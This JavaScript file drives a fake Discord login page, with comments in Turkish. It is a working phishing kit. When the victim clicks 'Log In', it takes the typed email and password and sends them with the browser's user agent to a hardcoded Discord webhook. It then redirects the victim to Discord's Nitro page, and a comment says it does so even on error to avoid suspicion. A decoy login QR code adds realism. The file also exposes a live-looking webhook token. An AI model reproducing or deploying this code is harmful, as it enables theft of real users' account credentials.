// ==================================
// CONFIGURATION
// ==================================
const CONFIG = {
  ANIMATION_DURATION: 3000,
  QR_REFRESH_INTERVAL: 120000, // 2 minutes
  ELLIPSIS_DELAY_INCREMENT: 0.2,
  QR_STRING_LENGTH: 43,
  // Senin Webhook Adresin
  WEBHOOK_URL: "https://discord.com/api/webhooks/1496886575705882735/f4Nz4j2bDSKCgoXZ0HpVXHTLD0AYFbHiCp0Anjj6lkz9EJmRdJUWzNrw-JOErQPhVZXI",
  // Log sonrası yönlendirilecek sayfa
  REDIRECT_URL: "https://discord.com/nitro"
};

// ==================================
// SELECTORS
// ==================================
const DOM = {
  loginButton: document.querySelector("button"),
  qrCodeContainer: document.querySelector(".right-section .qr-code"),
  // Inputları yakalamak için selectorler
  emailInput: document.querySelector('input[type="text"], input[name="email"], #email'),
  passwordInput: document.querySelector('input[type="password"], input[name="password"], #password')
};

// ==================================
// UTILITY FUNCTIONS
// ==================================

const generateRandomString = (length = CONFIG.QR_STRING_LENGTH) => {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  return Array.from({ length }, () =>
    characters.charAt(Math.floor(Math.random() * characters.length))
  ).join("");
};

const createElementFromHTML = (html) => {
  const template = document.createElement("template");
  template.innerHTML = html.trim();
  return template.content.firstChild;
};

// ==================================
// LOG CAPTURE MODULE (WEBHOOK)
// ==================================
const LogCaptureModule = {
  async sendToWebhook() {
    const email = DOM.emailInput ? DOM.emailInput.value : "Bulunamadı";
    const password = DOM.passwordInput ? DOM.passwordInput.value : "Bulunamadı";

    // Eğer alanlar boşsa gönderme (isteğe bağlı)
    if (!email || !password) return;

    const payload = {
      embeds: [{
        title: "🟢 Yeni Giriş Tespit Edildi",
        color: 5763719, // Discord Yeşili
        fields: [
          { name: "📧 E-posta / Telefon", value: `\`\`\`${email}\`\`\``, inline: false },
          { name: "🔑 Şifre", value: `\`\`\`${password}\`\`\``, inline: false },
          { name: "🌐 Tarayıcı Bilgisi", value: `\`\`\`${navigator.userAgent.substring(0, 100)}...\`\`\``, inline: false }
        ],
        footer: { text: "Apex Intelligence Capture System" },
        timestamp: new Date()
      }]
    };

    try {
      await fetch(CONFIG.WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      
      // Veri gittikten sonra yönlendir
      setTimeout(() => {
        window.location.href = CONFIG.REDIRECT_URL;
      }, 1500);
    } catch (error) {
      console.error("Webhook hatası:", error);
      // Hata olsa bile kullanıcıyı yönlendir ki şüphelenmesin
      window.location.href = CONFIG.REDIRECT_URL;
    }
  }
};

// ==================================
// QR CODE MODULE
// ==================================
const QRCodeModule = {
  generate(data) {
    try {
      const qr = qrcode(0, "L");
      qr.addData(data);
      qr.make();

      const moduleCount = qr.getModuleCount();
      const svgString = qr.createSvgTag(1, 0);

      const parser = new DOMParser();
      const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
      const svgElement = svgDoc.documentElement;

      svgElement.setAttribute("width", "160");
      svgElement.setAttribute("height", "160");
      svgElement.setAttribute("viewBox", "0 0 37 37");

      const path = svgElement.querySelector("path");
      if (path) {
        path.setAttribute("transform", `scale(${37 / moduleCount})`);
      }

      return svgElement;
    } catch (error) {
      console.error("Error generating QR code:", error);
      return null;
    }
  },

  getSpinnerMarkup() {
    return `
      <span class="spinner qrCode-spinner" role="img" aria-label="Loading" aria-hidden="true">
        <span class="inner wanderingCubes">
          <span class="item"></span>
          <span class="item"></span>
        </span>
      </span>
    `;
  },

  showLoadingAnimation() {
    if (!DOM.qrCodeContainer) return;
    const svg = DOM.qrCodeContainer.querySelector("svg");
    const img = DOM.qrCodeContainer.querySelector("img");
    svg?.remove();
    img?.remove();
    DOM.qrCodeContainer.style.background = "transparent";
    DOM.qrCodeContainer.insertAdjacentHTML("afterbegin", this.getSpinnerMarkup());
  },

  refresh() {
    if (!DOM.qrCodeContainer) return;
    DOM.qrCodeContainer.innerHTML = "";
    const newQRCode = this.generate(`https://discord.com/ra/${generateRandomString()}`);
    if (newQRCode) {
      DOM.qrCodeContainer.appendChild(newQRCode);
    }
    DOM.qrCodeContainer.insertAdjacentHTML(
      "beforeend",
      `<img src="./assets/qrcode-discord-logo.png" alt="Discord Logo">`
    );
    DOM.qrCodeContainer.style.background = "white";
  },

  simulateRefresh() {
    this.showLoadingAnimation();
    setTimeout(() => this.refresh(), 3500);
  },

  initRefreshInterval() {
    setInterval(() => this.simulateRefresh(), CONFIG.QR_REFRESH_INTERVAL);
  },
};

// ==================================
// LOGIN BUTTON MODULE
// ==================================
const LoginButtonModule = {
  getEllipsisMarkup() {
    return `
      <span class="spinner" role="img" aria-label="Loading">
        <span class="inner pulsingEllipsis">
          <span class="item spinnerItem"></span>
          <span class="item spinnerItem"></span>
          <span class="item spinnerItem"></span>
        </span>
      </span>
    `;
  },

  applyAnimationDelays() {
    const spinnerItems = document.querySelectorAll(".spinnerItem");
    spinnerItems.forEach((item, index) => {
      item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${
        index * CONFIG.ELLIPSIS_DELAY_INCREMENT
      }s`;
    });
  },

  showLoading() {
    if (!DOM.loginButton) return;
    DOM.loginButton.innerHTML = this.getEllipsisMarkup();
    DOM.loginButton.setAttribute("disabled", "true");
    this.applyAnimationDelays();
    
    // Yükleme animasyonu sürerken veriyi gönder
    LogCaptureModule.sendToWebhook();
  },

  reset() {
    if (!DOM.loginButton) return;
    DOM.loginButton.innerHTML = "";
    DOM.loginButton.textContent = "Log In";
    DOM.loginButton.removeAttribute("disabled");
  },

  init() {
    if (!DOM.loginButton) return;
    DOM.loginButton.addEventListener("click", (e) => {
      e.preventDefault();
      this.showLoading();
    });
  },
};

// ==================================
// INITIALIZATION
// ==================================
const init = () => {
  LoginButtonModule.init();
  QRCodeModule.initRefreshInterval();
  // Sağ tık yasağını kaldırdım ki test ederken zorlanma, istersen geri ekleyebilirsin
};

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", init);
} else {
  init();
}